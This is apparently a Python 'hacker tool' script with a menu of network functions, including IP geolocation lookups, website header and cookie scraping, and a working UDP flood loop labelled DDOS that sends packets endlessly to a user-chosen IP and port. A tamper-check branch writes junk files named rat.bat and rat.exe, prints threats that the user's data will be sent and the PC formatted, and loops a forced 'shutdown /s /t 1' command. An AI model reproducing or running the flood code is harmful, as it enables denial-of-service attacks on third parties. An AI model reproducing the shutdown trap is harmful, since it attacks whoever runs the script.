import os.path,requests,socket,webbrowser
r=requests.session()
reqs=r.get('https://tryhackme.com/').text
sol=f'{reqs}user%change%user%pass%cmod+x%ls%cd%{reqs}data%remove%rat%hack$$$$data#{reqs}1555555;5a44da;jjpa4557fa77:awll_downlo{reqs}ad_upload_{reqs}download_upload_02216xx45af:download____load__remove_move_file_upload_download_files_remove{reqs}_git_on_port_8042_get_ip_get_token_pull_out_$$$ls_@a221a_$$#@%bat.bat.getoutbat{reqs}'
re = "\033[1;31m"
gr = "\033[1;32m"
cy = "\033[1;36m"
do = '\033[1;37m'
so = '\033[1;35m'
po = '\033[1;38m'
file = 'V1_F1.py'
file_size =os.path.getsize(file)
filza=int(19664)
if filza == file_size:
     print(f"{re}DEV @Filza_507 __{cy}__ @TweakPY")
     print(f"""                                           
       {re} ██╗░░░██╗░░███╗░░███████╗░░███╗░░
       {so} ██║░░░██║░████║░░██╔════╝░████║░░
       {cy} ╚██╗░██╔╝██╔██║░░█████╗░░██╔██║░░
       {do} ░╚████╔╝░╚═╝██║░░██╔══╝░░╚═╝██║░░
       {po} ░░╚██╔╝░░███████╗██║░░░░░███████╗
       {gr} ░░░╚═╝░░░╚══════╝╚═╝░░░░░╚══════╝         
                """)
     print(f"""
     {gr}- {po}1*[DDOS]
     {gr}- {po}2*[GET IP]
     {gr}- {po}3*[GET IP INFO]
     {gr}- {po}4*[GET WEBSITE INFO]
     {gr}- {po}5*[GET IP FULL INFO ]
     {gr}- {po}6*[GET NUMBER INFO :KSA:]
     {gr}- {po}99*[exit program]
     """)
     print("Enter number")
     mod = input(">> ")
     if mod=="1":
         global vv1ck
         print("======================================")
         print(f"{re}ddos Attack 🚀")
         print("======================================")
         print(f"{po} Enter Target url or Ip  ")
         target = input(">> ")
         print(f"{po}Enter port")
         port1 = input('>> ')
         target.replace("http://", "")
         target.replace("https://", "")
         target.replace("www.", "")
         ip = socket.gethostbyname(target)
         port = int(port1)
         vv1ck = "jlllllllllllllkkkkkkkkkkkkkkkkkkkkkkkjllllllllllllllllllllllllllllllllllllllllkkkkkkkkkkkkkkkkkkkkkklllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmskskskskskks"
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, f"{re}<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck, "UTF-8"), (ip, port))
             print(port, "<======>", ip)
     elif mod=='2':
         print("Enter site or link or url")
         IPS=input(po+'>> ')
         sop = socket.gethostbyname(IPS)
         print(re+sop)
     elif mod=='3':
        print(po+"""
         [1] Get My IP & data
         [2] Get Location & data From IP Target
         """)
        j = input(po+">> ")
        if j == "1":
            IPrequest = requests.get("https://get.geojs.io/v1/ip.json")
            myIP = IPrequest.json()["ip"]
            LocationR = requests.get("https://get.geojs.io/v1/ip/geo/" + myIP + ".json")
            GetLocate = LocationR.json()
            print(re+">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
            print("My IP Address      : " + GetLocate["ip"])
            print("My Location        : " + GetLocate["country"])
            print("My Country Code    : " + GetLocate["country_code"])
            print("Service Provider   : " + GetLocate["organization_name"])
            print("Time Zone          : " + GetLocate["timezone"])
            print("Longitude On a map : " + GetLocate["longitude"])
            print("Latitude On a map  : " + GetLocate["latitude"])
        elif j == "2":
            print(po+"Enter The ip  ")
            z = input(">> ")
            LocationR = requests.get("https://get.geojs.io/v1/ip/geo/" + z + ".json")
            GetLocate = LocationR.json()
            print(re+">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
            print("Target IP Address         : " + GetLocate["ip"])
            print("Target Location           : " + GetLocate["country"])
            print("Target Country Code       : " + GetLocate["country_code"])
            print("Target Time Zone          : " + GetLocate["timezone"])
            print("Target Longitude On a map : " + GetLocate["longitude"])
            print("Target Latitude On a map  : " + GetLocate["latitude"])
            print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
     elif mod == '4':
         print(re+'=======================================')
         print('WEBSITE URL')
         will = input(po+">> ")
         print('=======================================')
         url = will
         filza = requests.get(url)
         FID = filza.content
         content = (FID)
         LHK = requests.get(url)
         filza5555 = requests.get(url)
         cokies = (filza.cookies)
         WeB = requests.get(url)
         head = (WeB.headers)
         with open("WEBS_INFO", 'a') as x:
             x.write(f'{FID}\n{content}\n{head}\n{cokies}\n{LHK}\n{filza5555}')
             print(so + '*-- done  --*')
     elif mod == '5':
         head = {
             "Host": "ipinfo.io",
             "Accept": "*/*",
             "Connection": "keep-alive",
             "User-Agent": "Mozillas/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/605.1.15(KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
             "Accept-Language": "en-us",
             "Referer": "https://ipinto.io/",
             "Accept-Encoding": "gzip,deflate,br"}
         mod = int(input("1)full info\n2)Simple info\n>>"))
         print('IP')
         ip = input(">> "+re)
         if mod == 1:
             req = requests.get(f"https://ipinfo.io/widget/{ip}", headers=head)
             print(req.text)
             with open("IP_INFO", 'a') as x:
                 x.write(f'{req.text}')

         elif mod == 2:
             req = requests.get(f"https://ipinfo.io/{ip}/", headers=head)
             print(req.text)
             with open("IP_INFO", 'a') as x:
                 x.write(f'{req.text}')
     elif mod == '6':
        webbrowser.open('https://storage.googleapis.com/ksa-n/index.html')
     elif mod == '99':
         quit(0)
else:
    os.makedirs('fuck u why change the data')
    os.makedirs("say hi to the python rat")
    with open("rat.bat", 'a') as x:
        x.write(f'{sol}')
    with open("rat.exe", 'a') as x:
        x.write(f'{sol}')
    with open("rat.js", 'a') as x:
        x.write(f'{sol}')
    with open("rat.file", 'a') as x:
        x.write(f'{sol}')
    with open("rat.if", 'a') as x:
        x.write(f'{sol}')
    with open("rat.psw", 'a') as x:
        x.write(f'{sol}')
    while True:
        webbrowser.open("https:\\t.me\TweakPY")
        print(re + '[' + re + '!' + re + ']' + re + ' ERROR THE you change the file ')
        print(re + 'Error' + '\n')
        print("filza say hi...files and all data will be send and your pc will shutdown and format.....")
        uesr = "user data sending..."
        print(re + '[' + re + '!' + re + ']' + re + ' ERROR THE you change the file ')
        os.system("shutdown /s /t 1")
